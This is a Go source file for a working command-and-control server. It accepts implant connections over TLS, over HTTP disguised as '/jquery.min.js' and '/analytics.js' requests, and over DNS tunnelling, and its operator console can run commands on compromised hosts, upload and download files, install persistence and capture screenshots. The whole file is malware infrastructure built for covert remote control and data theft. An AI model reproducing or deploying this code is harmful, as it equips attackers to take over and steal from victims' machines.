package main

import (
	"bufio"
	"crypto/tls"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

type Session struct {
	ID          string
	RemoteIP    string
	ConnectedAt time.Time
	Conn        net.Conn
	CmdQueue    chan string
	RespQueue   chan string
	IsHTTP      bool
	IsDNS       bool
	mu          sync.Mutex
}

var sessions = make(map[string]*Session)
var scanner = bufio.NewScanner(os.Stdin)
var db *sql.DB
var sessionsMu sync.Mutex

func initDB() {
	var err error
	db, err = sql.Open("sqlite3", "./teamserver.db")
	if err != nil {
		fmt.Printf("[-] DB error: %s\n", err)
		os.Exit(1)
	}
	db.Exec(`CREATE TABLE IF NOT EXISTS sessions (
		id TEXT PRIMARY KEY,
		remote_ip TEXT,
		connected_at DATETIME
	)`)
	db.Exec(`CREATE TABLE IF NOT EXISTS commands (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		session_id TEXT,
		command TEXT,
		response TEXT,
		executed_at DATETIME
	)`)
	fmt.Println("[*] Database initialized")
}

func logSession(s *Session) {
	db.Exec(`INSERT OR IGNORE INTO sessions (id, remote_ip, connected_at) VALUES (?, ?, ?)`,
		s.ID, s.RemoteIP, s.ConnectedAt)
}

func logCommand(sessionID, cmd, resp string) {
	db.Exec(`INSERT INTO commands (session_id, command, response, executed_at) VALUES (?, ?, ?, ?)`,
		sessionID, cmd, resp, time.Now())
}

func parseDNSQuery(buf []byte) (string, uint16, int) {
	if len(buf) < 12 {
		return "", 0, -1
	}
	txid := uint16(buf[0])<<8 | uint16(buf[1])
	offset := 12
	var labels []string
	for offset < len(buf) {
		length := int(buf[offset])
		if length == 0 {
			offset++
			break
		}
		if offset+1+length > len(buf) {
			break
		}
		labels = append(labels, string(buf[offset+1:offset+1+length]))
		offset += 1 + length
	}
	if len(labels) == 0 {
		return "", txid, offset
	}
	return strings.Join(labels, "."), txid, offset
}

func buildDNSResponse(txid uint16, query []byte, queryEnd int, txtData string) []byte {
	resp := make([]byte, 0, 512)
	resp = append(resp, byte(txid>>8), byte(txid))
	resp = append(resp, 0x81, 0x80)
	resp = append(resp, 0x00, 0x01)
	resp = append(resp, 0x00, 0x01)
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, query[12:queryEnd+4]...)
	resp = append(resp, 0xc0, 0x0c)
	resp = append(resp, 0x00, 0x10)
	resp = append(resp, 0x00, 0x01)
	resp = append(resp, 0x00, 0x00, 0x00, 0x1e)
	txtBytes := []byte(txtData)
	rdlen := uint16(len(txtBytes) + 1)
	resp = append(resp, byte(rdlen>>8), byte(rdlen))
	resp = append(resp, byte(len(txtBytes)))
	resp = append(resp, txtBytes...)
	return resp
}

func startDNSListener() {
	addr, err := net.ResolveUDPAddr("udp", "0.0.0.0:5354")
	if err != nil {
		fmt.Printf("[-] DNS listener error: %s\n", err)
		return
	}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		fmt.Printf("[-] DNS listen error: %s\n", err)
		return
	}
	fmt.Println("[*] DNS listener on 0.0.0.0:5354")

	buf := make([]byte, 512)
	for {
		n, clientAddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}
		go func(data []byte, addr *net.UDPAddr) {
			qname, txid, qend := parseDNSQuery(data)
			if qend < 0 {
				return
			}
			if !strings.Contains(qname, "c2.ghost-relay.lan") {
				return
			}
			parts := strings.SplitN(qname, ".c2.ghost-relay.lan", 2)
			if len(parts) == 0 {
				return
			}
			payload := parts[0]
			decoded, err := hex.DecodeString(payload)
			if err != nil {
				return
			}
			msg := string(decoded)

			if strings.HasPrefix(msg, "register:") {
				sid := fmt.Sprintf("dns-%d", time.Now().UnixNano())
				session := &Session{
					ID:          sid,
					RemoteIP:    addr.String(),
					ConnectedAt: time.Now(),
					CmdQueue:    make(chan string, 10),
					RespQueue:   make(chan string, 10),
					IsDNS:       true,
				}
				sessionsMu.Lock()
				sessions[sid] = session
				sessionsMu.Unlock()
				logSession(session)
				fmt.Printf("\n[+] New DNS session %s from %s\n> ", sid, addr.String())
				respData := hex.EncodeToString([]byte("sid:" + sid))
				resp := buildDNSResponse(txid, data, qend, respData)
				conn.WriteToUDP(resp, addr)
				return
			}

			colonIdx := strings.Index(msg, ":result:")
			if colonIdx > 0 {
				sid := msg[:colonIdx]
				result := msg[colonIdx+8:]
				resultBytes, err := hex.DecodeString(result)
				if err == nil {
					sessionsMu.Lock()
					session, ok := sessions[sid]
					sessionsMu.Unlock()
					if ok {
						session.RespQueue <- string(resultBytes)
					}
				}
			}

			if strings.HasSuffix(msg, ":poll") {
				sid := msg[:len(msg)-5]
				sessionsMu.Lock()
				session, ok := sessions[sid]
				sessionsMu.Unlock()
				if !ok {
					return
				}
				var cmdHex string
				select {
				case cmd := <-session.CmdQueue:
					cmdHex = hex.EncodeToString([]byte(cmd))
				default:
					cmdHex = hex.EncodeToString([]byte("noop"))
				}
				resp := buildDNSResponse(txid, data, qend, cmdHex)
				conn.WriteToUDP(resp, addr)
			}
		}(buf[:n], clientAddr)
	}
}

func startHTTPListener() {
	mux := http.NewServeMux()

	mux.HandleFunc("/jquery.min.js", func(w http.ResponseWriter, r *http.Request) {
		sid := r.URL.Query().Get("id")
		if sid == "" {
			sid = fmt.Sprintf("http-%d", time.Now().UnixNano())
			session := &Session{
				ID:          sid,
				RemoteIP:    r.RemoteAddr,
				ConnectedAt: time.Now(),
				CmdQueue:    make(chan string, 10),
				RespQueue:   make(chan string, 10),
				IsHTTP:      true,
			}
			sessionsMu.Lock()
			sessions[sid] = session
			sessionsMu.Unlock()
			logSession(session)
			fmt.Printf("\n[+] New HTTP session %s from %s\n> ", sid, r.RemoteAddr)
			w.Header().Set("Content-Type", "application/javascript")
			fmt.Fprintf(w, "var _sid='%s';", sid)
			return
		}
		sessionsMu.Lock()
		session, ok := sessions[sid]
		sessionsMu.Unlock()
		if !ok {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/javascript")
		select {
		case cmd := <-session.CmdQueue:
			encoded := base64.StdEncoding.EncodeToString([]byte(cmd))
			fmt.Fprintf(w, "var _c='%s';", encoded)
		default:
			fmt.Fprintf(w, "var _c='';")
		}
	})

	mux.HandleFunc("/analytics.js", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.NotFound(w, r)
			return
		}
		sid := r.URL.Query().Get("id")
		body, err := io.ReadAll(r.Body)
		if err != nil || sid == "" {
			http.NotFound(w, r)
			return
		}
		sessionsMu.Lock()
		session, ok := sessions[sid]
		sessionsMu.Unlock()
		if !ok {
			http.NotFound(w, r)
			return
		}
		decoded, err := base64.StdEncoding.DecodeString(string(body))
		if err != nil {
			decoded = body
		}
		session.RespQueue <- string(decoded)
		w.WriteHeader(http.StatusOK)
	})

	fmt.Println("[*] HTTP listener on 0.0.0.0:8080")
	http.ListenAndServe("0.0.0.0:8080", mux)
}

func handleConnection(conn net.Conn) {
	session := &Session{
		ID:          fmt.Sprintf("%d", time.Now().UnixNano()),
		RemoteIP:    conn.RemoteAddr().String(),
		ConnectedAt: time.Now(),
		Conn:        conn,
		CmdQueue:    make(chan string, 10),
		RespQueue:   make(chan string, 10),
		IsHTTP:      false,
		IsDNS:       false,
	}
	sessionsMu.Lock()
	sessions[session.ID] = session
	sessionsMu.Unlock()
	logSession(session)
	fmt.Printf("\n[+] New session %s from %s\n> ", session.ID, session.RemoteIP)

	go func() {
		for cmd := range session.CmdQueue {
			conn.Write([]byte(cmd + "\n"))
		}
	}()

	go func() {
		s := bufio.NewScanner(conn)
		for s.Scan() {
			session.RespQueue <- s.Text()
		}
		sessionsMu.Lock()
		delete(sessions, session.ID)
		sessionsMu.Unlock()
		fmt.Printf("\n[-] Session %s disconnected\n> ", session.ID)
	}()
}

func uploadFile(s *Session, localPath string, remotePath string) {
	data, err := os.ReadFile(localPath)
	if err != nil {
		fmt.Printf("[-] Cannot read file: %s\n", err)
		return
	}
	size := len(data)
	header := fmt.Sprintf("__upload__%s__%d\n", remotePath, size)
	s.Conn.Write([]byte(header))
	time.Sleep(200 * time.Millisecond)
	s.Conn.Write(data)
	select {
	case resp := <-s.RespQueue:
		fmt.Printf("[+] Upload: %s\n", resp)
	case <-time.After(15 * time.Second):
		fmt.Println("[-] Upload timeout")
	}
}

func downloadFile(s *Session, remotePath string) {
	cmd := fmt.Sprintf("__download__%s\n", remotePath)
	s.Conn.Write([]byte(cmd))
	select {
	case resp := <-s.RespQueue:
		if strings.HasPrefix(resp, "error:") {
			fmt.Printf("[-] Download failed: %s\n", resp)
			return
		}
		data, err := base64.StdEncoding.DecodeString(resp)
		if err != nil {
			fmt.Printf("[-] Base64 decode error: %s\n", err)
			return
		}
		filename := remotePath[strings.LastIndex(remotePath, "/")+1:]
		outPath := "./downloads/" + filename
		os.MkdirAll("./downloads", 0755)
		err = os.WriteFile(outPath, data, 0644)
		if err != nil {
			fmt.Printf("[-] Cannot write file: %s\n", err)
			return
		}
		fmt.Printf("[+] Downloaded %d bytes → %s\n", len(data), outPath)
	case <-time.After(15 * time.Second):
		fmt.Println("[-] Download timeout")
	}
}

func screenshot(s *Session) {
	s.CmdQueue <- "DISPLAY=:1 scrot /tmp/screen.png 2>/dev/null || DISPLAY=:1 import -window root /tmp/screen.png 2>/dev/null"
	select {
	case <-s.RespQueue:
	case <-time.After(10 * time.Second):
		fmt.Println("[-] Screenshot command timeout")
		return
	}
	time.Sleep(1 * time.Second)
	fmt.Println("[*] Downloading screenshot...")
	downloadFile(s, "/tmp/screen.png")
}

func interactSession(s *Session) {
	fmt.Printf("[*] Interacting with %s - type 'background' to return\n", s.ID)
	fmt.Println("    Commands: upload <local> <remote> | download <remote> | persist | screenshot | background")
	fmt.Print("implant> ")
	for scanner.Scan() {
		input := strings.TrimSpace(scanner.Text())
		parts := strings.Fields(input)
		if len(parts) == 0 {
			fmt.Print("implant> ")
			continue
		}
		if input == "background" {
			fmt.Println("[*] Backgrounding session")
			return
		}
		if parts[0] == "upload" {
			if len(parts) < 3 {
				fmt.Println("  Usage: upload <local_file> <remote_path>")
			} else {
				uploadFile(s, parts[1], parts[2])
			}
			fmt.Print("implant> ")
			continue
		}
		if parts[0] == "download" {
			if len(parts) < 2 {
				fmt.Println("  Usage: download <remote_path>")
			} else {
				downloadFile(s, parts[1])
			}
			fmt.Print("implant> ")
			continue
		}
		if parts[0] == "persist" {
			s.Conn.Write([]byte("__persist__\n"))
			select {
			case resp := <-s.RespQueue:
				fmt.Printf("[+] %s\n", resp)
			case <-time.After(15 * time.Second):
				fmt.Println("[-] Persist timeout")
			}
			fmt.Print("implant> ")
			continue
		}
		if parts[0] == "screenshot" {
			screenshot(s)
			fmt.Print("implant> ")
			continue
		}
		s.CmdQueue <- input
		select {
		case resp := <-s.RespQueue:
			logCommand(s.ID, input, resp)
			fmt.Println(resp)
		case <-time.After(10 * time.Second):
			logCommand(s.ID, input, "no response")
			fmt.Println("[-] No response from implant")
		}
		fmt.Print("implant> ")
	}
}

func operatorCLI() {
	fmt.Println("[*] Operator CLI ready. Type 'help' for commands.")
	fmt.Print("> ")
	for scanner.Scan() {
		input := strings.TrimSpace(scanner.Text())
		parts := strings.Fields(input)
		if len(parts) == 0 {
			fmt.Print("> ")
			continue
		}
		switch parts[0] {
		case "help":
			fmt.Println("  sessions              - list active sessions")
			fmt.Println("  history               - show command history")
			fmt.Println("  use <id>              - interact with session")
			fmt.Println("  exit                  - quit")
			fmt.Println("  [in session]")
			fmt.Println("  upload <src> <dst>    - upload file to implant")
			fmt.Println("  download <path>       - download file from implant")
			fmt.Println("  persist               - install persistence on target")
			fmt.Println("  screenshot            - capture target screen")
		case "sessions":
			if len(sessions) == 0 {
				fmt.Println("  No active sessions")
			}
			sessionsMu.Lock()
			for id, s := range sessions {
				proto := "TLS"
				if s.IsHTTP {
					proto = "HTTP"
				} else if s.IsDNS {
					proto = "DNS"
				}
				fmt.Printf("  [%s] %s %s - connected %s ago\n",
					id, proto, s.RemoteIP, time.Since(s.ConnectedAt).Round(time.Second))
			}
			sessionsMu.Unlock()
		case "history":
			rows, err := db.Query(`SELECT session_id, command, response, executed_at
				FROM commands ORDER BY executed_at DESC LIMIT 20`)
			if err != nil {
				fmt.Println("[-] DB error")
				break
			}
			for rows.Next() {
				var sid, cmd, resp, ts string
				rows.Scan(&sid, &cmd, &resp, &ts)
				fmt.Printf("  [%s] %s => %s (%s)\n", sid[:8], cmd, resp, ts)
			}
			rows.Close()
		case "use":
			if len(parts) < 2 {
				fmt.Println("  Usage: use <session_id>")
			} else {
				sessionsMu.Lock()
				s, ok := sessions[parts[1]]
				sessionsMu.Unlock()
				if !ok {
					fmt.Println("  Session not found")
				} else {
					interactSession(s)
				}
			}
		case "exit":
			os.Exit(0)
		default:
			fmt.Printf("  Unknown command: %s\n", parts[0])
		}
		fmt.Print("> ")
	}
}

func main() {
	initDB()

	cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		fmt.Printf("[-] Failed to load cert: %s\n", err)
		return
	}

	config := &tls.Config{Certificates: []tls.Certificate{cert}}

	listener, err := tls.Listen("tcp", "0.0.0.0:4444", config)
	if err != nil {
		fmt.Printf("[-] Error: %s\n", err)
		return
	}
	defer listener.Close()
	fmt.Println("[*] Teamserver listening on 0.0.0.0:4444 (TLS)")

	go startHTTPListener()
	go startDNSListener()

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				continue
			}
			go handleConnection(conn)
		}
	}()

	operatorCLI()
}
